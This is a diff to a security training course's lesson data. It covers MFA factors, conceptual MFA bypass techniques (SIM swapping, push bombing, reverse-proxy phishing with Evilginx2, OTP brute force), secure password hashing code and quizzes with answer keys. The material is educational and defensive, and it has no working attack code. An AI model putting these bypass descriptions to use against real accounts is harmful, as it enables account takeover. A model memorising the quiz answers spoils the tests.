-Imagine you buy the strongest, thickest metal door in the world for your house. It looks completely unbreakable! But then, you use a flimsy, cheap key, and you accidentally drop that key on the sidewalk where anyone can find it. It doesn't matter how strong the door is; if someone has the key, they can just walk right in. Passwords are just like that flimsy key. Even if a website's security is amazing, if a hacker tricks you into giving them your password (or steals it from another website), they can walk right into your account. To fix this, websites use Multi-Factor Authentication (MFA). MFA adds a completely different, second lock to the door. Even if the hacker steals your password key, they still need the second key (like a special code sent to your physical cell phone) to get inside. MFA makes your account incredibly safe, but hackers are always inventing sneaky new tricks to bypass even the strongest double-locks.
-
-MFA FACTORS (TYPES):
-  Something you KNOW:  password, PIN, security question
-  Something you HAVE:  TOTP app, SMS, hardware key, email code
-  Something you ARE:   fingerprint, face scan, voice recognition
-
-MFA TYPES RANKED (WEAKEST → STRONGEST):
-  1. Security questions (worst — guessable/publicly searchable)
-  2. SMS OTP (weak — SIM swapping, SS7 attacks, phishing)
-  3. Email OTP (weak — email account often single-factor)
-  4. TOTP (good — Google Authenticator, Authy — offline, time-based)
-  5. Push notifications (good — Microsoft/Duo Authenticator)
-  6. Hardware security keys FIDO2/WebAuthn (best — phishing-resistant)
-
-SIM SWAPPING ATTACK (bypasses SMS MFA):
-  1. Attacker social-engineers the victim's mobile carrier
-  2. Convinces them to transfer the victim's phone number to attacker's SIM
-  3. All SMS messages (including OTPs) now go to attacker's phone
-  4. Attacker resets passwords and bypasses SMS MFA
-  High-profile victims: Twitter CEO, crypto exchange CEOs.
-
-MFA FATIGUE / PUSH BOMBING:
-  Attackers with stolen credentials spam MFA push notifications.
-  The victim gets dozens of prompts and eventually clicks "Approve."
-  Used in the Uber breach (2022) — attacker sent 20+ push requests.
-  Fix: Use number matching in push notifications.
-
-REAL-TIME PHISHING (ATTACKER-IN-THE-MIDDLE):
-  Tools like Evilginx2 / Modlishka act as reverse proxies:
-  1. Victim visits fake login page (e.g., paypa1.com)
-  2. Proxy forwards credentials AND MFA token to real PayPal
-  3. Proxy captures the session cookie from the response
-  4. Attacker uses session cookie — MFA completely bypassed!
-  Fix: Only hardware FIDO2 keys prevent this (they bind to the domain).
-
-OTP BRUTE FORCE:
-  6-digit TOTP: 1,000,000 combinations
-  If no rate limiting: brute forceable in seconds
-  Fix: Limit OTP attempts, add progressive delays.`,
-    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_mfa_diagram.png" alt="Multi-Factor Authentication Deep Dive"></div>
-
-WHY DO WE NEED MULTI-FACTOR AUTHENTICATION?
-Imagine you buy the strongest, thickest metal door in the world for your house. It looks completely unbreakable! But then, you use a flimsy, cheap key, and you accidentally drop that key on the sidewalk where anyone can find it. It doesn't matter how strong the door is; if someone has the key, they can just walk right in. Passwords are just like that flimsy key. Even if a website's security is amazing, if a hacker tricks you into giving them your password (or steals it from another website), they can walk right into your account. To fix this, websites use Multi-Factor Authentication (MFA). MFA adds a completely different, second lock to the door. Even if the hacker steals your password key, they still need the second key (like a special code sent to your physical cell phone) to get inside. MFA makes your account incredibly safe, but hackers are always inventing sneaky new tricks to bypass even the strongest double-locks.
-
-MFA FACTORS (TYPES):
-  Something you KNOW:  password, PIN, security question
-  Something you HAVE:  TOTP app, SMS, hardware key, email code
-  Something you ARE:   fingerprint, face scan, voice recognition
-
-MFA TYPES RANKED (WEAKEST → STRONGEST):
-  1. Security questions (worst — guessable/publicly searchable)
-  2. SMS OTP (weak — SIM swapping, SS7 attacks, phishing)
-  3. Email OTP (weak — email account often single-factor)
-  4. TOTP (good — Google Authenticator, Authy — offline, time-based)
-  5. Push notifications (good — Microsoft/Duo Authenticator)
-  6. Hardware security keys FIDO2/WebAuthn (best — phishing-resistant)
-
-SIM SWAPPING ATTACK (bypasses SMS MFA):
-  1. Attacker social-engineers the victim's mobile carrier
-  2. Convinces them to transfer the victim's phone number to attacker's SIM
-  3. All SMS messages (including OTPs) now go to attacker's phone
-  4. Attacker resets passwords and bypasses SMS MFA
-  High-profile victims: Twitter CEO, crypto exchange CEOs.
-
-MFA FATIGUE / PUSH BOMBING:
-  Attackers with stolen credentials spam MFA push notifications.
-  The victim gets dozens of prompts and eventually clicks "Approve."
-  Used in the Uber breach (2022) — attacker sent 20+ push requests.
-  Fix: Use number matching in push notifications.
-
-REAL-TIME PHISHING (ATTACKER-IN-THE-MIDDLE):
-  Tools like Evilginx2 / Modlishka act as reverse proxies:
-  1. Victim visits fake login page (e.g., paypa1.com)
-  2. Proxy forwards credentials AND MFA token to real PayPal
-  3. Proxy captures the session cookie from the response
-  4. Attacker uses session cookie — MFA completely bypassed!
-  Fix: Only hardware FIDO2 keys prevent this (they bind to the domain).
-
-OTP BRUTE FORCE:
-  6-digit TOTP: 1,000,000 combinations
-  If no rate limiting: brute forceable in seconds
-  Fix: Limit OTP attempts, add progressive delays.`,
+    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_mfa_diagram.png" alt="MFA Deep Dive"></div>
+      <h3>Multi-Factor Authentication (MFA)</h3>
+      <p>Multi-Factor Authentication (MFA) requires users to provide two or more verification factors to gain access. Factors are: Something you KNOW (password), Something you HAVE (phone), and Something you ARE (biometrics). SMS is vulnerable to interception, while hardware security keys provide cryptographic, phishing-resistant defense.</p>
+      <p>Imagine you buy the strongest metal door in the world for your house, but you accidentally drop the key on the sidewalk. Passwords are like that key. Even if a website's security is amazing, if a hacker tricks you into giving them your password, they walk right in. MFA adds a completely different, second lock to the door. Even if the hacker steals your password key, they still need the second key (like a special code sent to your physical cell phone) to get inside.</p>
+      <h3>MFA Bypass Techniques</h3>
+      <div class="step-block">
+        <div class="step-num">Bypass 1</div>
+        <div class="step-body"><strong>SIM Swapping (Attacking SMS)</strong><br>An attacker social-engineers a mobile carrier into transferring the victim's phone number to the attacker's SIM card. All SMS-based OTPs are routed to the attacker.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Bypass 2</div>
+        <div class="step-body"><strong>MFA Fatigue (Push Bombing)</strong><br>An attacker repeatedly triggers MFA push notifications to the victim's phone at 3:00 AM. Annoyed, the victim eventually taps "Approve" just to make it stop, granting access.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Bypass 3</div>
+        <div class="step-body"><strong>Attacker-in-the-Middle (AiTM) Phishing</strong><br>Using tools like Evilginx2, attackers set up a reverse proxy. When the victim enters their TOTP code, the proxy forwards it instantly and steals the valid session cookie.</div>
+      </div>`,
     questions: [
-      { q: "What social engineering attack transfers a victim's phone number to an attacker's SIM card to steal SMS OTPs?", a: "SIM swapping" },
-      { q: "What MFA bypass sends repeated push notification requests until the victim approves one?", a: "MFA fatigue / push bombing" },
-      { q: "What tool acts as a reverse proxy to steal session cookies in real-time, bypassing TOTP MFA?", a: "Evilginx2 (or Modlishka)" },
-      { q: "What is the only MFA type that is resistant to real-time phishing attacks?", a: "Hardware security keys (FIDO2/WebAuthn)" },
-      { q: "What 2022 company was breached via MFA fatigue (push bombing) by an 18-year-old attacker?", a: "Uber" }
+      { q: "What social engineering attack transfers a victim's phone number to an attacker's SIM card to steal SMS OTPs?", a: "SIM swapping", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What MFA bypass sends repeated push notification requests until the victim approves one?", a: "MFA fatigue / push bombing", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What tool acts as a reverse proxy to steal session cookies in real-time, bypassing TOTP MFA?", a: "Evilginx2 (or Modlishka)", hint: "Look for the specific tools mentioned in the lesson." },
+      { q: "What is the only MFA type that is resistant to real-time phishing attacks?", a: "Hardware security keys (FIDO2/WebAuthn)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What 2022 company was breached via MFA fatigue (push bombing) by an 18-year-old attacker?", a: "Uber", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
     ]
   },
   {
-    title: "Secure Authentication Implementation",
+    title: "6. Secure Authentication Implementation",
     points: 10,
-    content: `BUILDING THE PERFECT FRONT DOOR
-Imagine you are the architect tasked with building a massive bank vault. You can't just slap a padlock on a wooden door and call it a day. You have to think about every single tiny detail! You need thick steel walls, laser beams, security cameras, and guards who check IDs perfectly every single time. In the computer world, building a secure login system is exactly like building that bank vault. If a programmer gets lazy and forgets to turn on the security cameras (like logging failed login attempts), or uses a cheap padlock (like using a weak password algorithm), hackers will find that mistake and break in. Implementing authentication correctly means paying extremely careful attention to every detail, from how the passwords are scrambled and stored in the database, to exactly how the cookies are handed out to the users. It takes a lot of hard work to build the perfect digital front door!
-
-PASSWORD HASHING — CORRECT IMPLEMENTATION:
-
-Python (bcrypt):
-  import bcrypt
-  # Hash a password:
-  hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
-  # Verify a password:
-  if bcrypt.checkpw(input.encode(), hashed): print("Valid!")
-
-Python (Argon2 — modern best practice):
-  from argon2 import PasswordHasher
-  ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
-  hashed = ph.hash(password)
-  ph.verify(hashed, input_password)
-
-Node.js (bcrypt):
-  const bcrypt = require("bcrypt");
-  const hash = await bcrypt.hash(password, 12);
-  const valid = await bcrypt.compare(password, hash);
-
-PHP:
-  $hash = password_hash($password, PASSWORD_ARGON2ID);
-  password_verify($password, $hash);  // Returns true/false
-
-SECURE LOGIN ENDPOINT CHECKLIST:
-   Use HTTPS (enforce with HSTS header)
-   Rate limit: max 5-10 attempts per minute per IP
-   Progressive delay: after 3 failures, 1s wait; after 5, 5s wait
-   Account lockout: 30min lockout after 10 failures
-   Generic error messages: always "Invalid credentials"
-   Log all failed login attempts with IP and timestamp
-   CSRF token on login form (prevents CSRF-based auto-login)
-   Regenerate session ID upon successful login
-   Set session cookies: HttpOnly; Secure; SameSite=Strict
-
-SECURE PASSWORD RESET:
-   Generate cryptographically random tokens: secrets.token_urlsafe(32)
-   Store only the hash of the token (not plaintext)
-   Token expires in 15-60 minutes
-   Invalidate token after first use
-   Send to verified email only
-   Don't reveal if email exists ("If your email is registered, you'll get a link")
-
-MFA IMPLEMENTATION:
-  TOTP: Use pyotp (Python) or speakeasy (Node.js)
-  Hardware keys: Use the WebAuthn API
-  Backup codes: Generate 10 one-time use 8-digit codes on MFA setup`,
-    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_secure_impl_diagram.png" alt="Secure Authentication Implementation"></div>
-
-BUILDING THE PERFECT FRONT DOOR
-Imagine you are the architect tasked with building a massive bank vault. You can't just slap a padlock on a wooden door and call it a day. You have to think about every single tiny detail! You need thick steel walls, laser beams, security cameras, and guards who check IDs perfectly every single time. In the computer world, building a secure login system is exactly like building that bank vault. If a programmer gets lazy and forgets to turn on the security cameras (like logging failed login attempts), or uses a cheap padlock (like using a weak password algorithm), hackers will find that mistake and break in. Implementing authentication correctly means paying extremely careful attention to every detail, from how the passwords are scrambled and stored in the database, to exactly how the cookies are handed out to the users. It takes a lot of hard work to build the perfect digital front door!
-
-PASSWORD HASHING — CORRECT IMPLEMENTATION:
-
-Python (bcrypt):
-  import bcrypt
-  # Hash a password:
-  hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
-  # Verify a password:
-  if bcrypt.checkpw(input.encode(), hashed): print("Valid!")
-
-Python (Argon2 — modern best practice):
-  from argon2 import PasswordHasher
-  ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
-  hashed = ph.hash(password)
-  ph.verify(hashed, input_password)
-
-Node.js (bcrypt):
-  const bcrypt = require("bcrypt");
-  const hash = await bcrypt.hash(password, 12);
-  const valid = await bcrypt.compare(password, hash);
-
-PHP:
-  $hash = password_hash($password, PASSWORD_ARGON2ID);
-  password_verify($password, $hash);  // Returns true/false
-
-SECURE LOGIN ENDPOINT CHECKLIST:
-   Use HTTPS (enforce with HSTS header)
-   Rate limit: max 5-10 attempts per minute per IP
-   Progressive delay: after 3 failures, 1s wait; after 5, 5s wait
-   Account lockout: 30min lockout after 10 failures
-   Generic error messages: always "Invalid credentials"
-   Log all failed login attempts with IP and timestamp
-   CSRF token on login form (prevents CSRF-based auto-login)
-   Regenerate session ID upon successful login
-   Set session cookies: HttpOnly; Secure; SameSite=Strict
-
-SECURE PASSWORD RESET:
-   Generate cryptographically random tokens: secrets.token_urlsafe(32)
-   Store only the hash of the token (not plaintext)
-   Token expires in 15-60 minutes
-   Invalidate token after first use
-   Send to verified email only
-   Don't reveal if email exists ("If your email is registered, you'll get a link")
-
-MFA IMPLEMENTATION:
-  TOTP: Use pyotp (Python) or speakeasy (Node.js)
-  Hardware keys: Use the WebAuthn API
-  Backup codes: Generate 10 one-time use 8-digit codes on MFA setup`,
+    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_secure_impl_diagram.png" alt="Secure Implementation"></div>
+      <h3>Building a Secure Architecture</h3>
+      <p>A secure authentication implementation must unify strong password hashing algorithms (Argon2, bcrypt), rigorous session management controls, rate limiting, and robust password reset workflows. Security is a chain; if an application uses military-grade hashing but allows infinite guesses, the entire system is compromised.</p>
+      <p>Imagine you are the architect building a massive bank vault. You can't just slap a padlock on a wooden door. You need thick steel walls, laser beams, security cameras, and guards who check IDs perfectly every single time. Building a secure login system is exactly like building that bank vault. If a programmer gets lazy and forgets to turn on the security cameras (like logging failed login attempts), hackers will find that mistake and break in.</p>
+      <h3>Implementation Best Practices</h3>
+      <div class="step-block">
+        <div class="step-num">Practice 1</div>
+        <div class="step-body"><strong>Adaptive Hashing</strong><br>Use memory-hard hashing algorithms like Argon2 or bcrypt. Never use fast hashes like MD5 or SHA-256 for passwords.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Practice 2</div>
+        <div class="step-body"><strong>Session & Cookie Security</strong><br>Always regenerate the session ID immediately after a successful login to prevent Session Fixation. Flag all session cookies with <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite=Strict</code>.</div>
+      </div>
+      <div class="step-block">
+        <div class="step-num">Practice 3</div>
+        <div class="step-body"><strong>Secure Account Recovery</strong><br>Generate password reset tokens using cryptographically secure random number generators. Store only the hashed token in the database, expire it within 15-30 minutes, and strictly invalidate it upon its first use.</div>
+      </div>`,
     questions: [
-      { q: "What bcrypt cost factor value (rounds) is recommended for a good balance of security and performance?", a: "12 (rounds=12)" },
-      { q: "What PHP function is the correct way to hash a password using Argon2?", a: "password_hash($password, PASSWORD_ARGON2ID)" },
-      { q: "After a successful login, what must the server do to the session ID to prevent session fixation?", a: "Regenerate (rotate) the session ID" },
-      { q: "What security measure on password reset tokens prevents them from being used more than once?", a: "Invalidate/delete the token after first use" },
-      { q: "What Python module provides cryptographically secure random token generation for password reset links?", a: "secrets (secrets.token_urlsafe())" }
+      { q: "What bcrypt cost factor value (rounds) is recommended for a good balance of security and performance?", a: "12 (rounds=12)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What PHP function is the correct way to hash a password using Argon2?", a: "password_hash($password, PASSWORD_ARGON2ID)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "After a successful login, what must the server do to the session ID to prevent session fixation?", a: "Regenerate (rotate) the session ID", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What security measure on password reset tokens prevents them from being used more than once?", a: "Invalidate/delete the token after first use", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
+      { q: "What Python module provides cryptographically secure random token generation for password reset links?", a: "secrets (secrets.token_urlsafe())", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
     ]
   }
 ];
